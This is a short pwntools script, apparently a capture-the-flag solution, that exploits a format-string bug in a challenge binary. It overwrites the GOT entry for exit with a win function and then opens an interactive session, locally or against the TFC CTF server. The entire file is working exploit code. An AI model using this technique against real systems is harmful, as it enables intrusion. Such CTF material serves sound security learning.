#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
e = ELF("./src")
PAYLOAD = fmtstr_payload(6, {e.got.exit: e.sym.win})

if args.REMOTE:
    p = remote('challs.tfcctf.com', int(input("Port: ")))
else:
    p = e.process()

p.sendline(PAYLOAD)
p.clean()
p.interactive()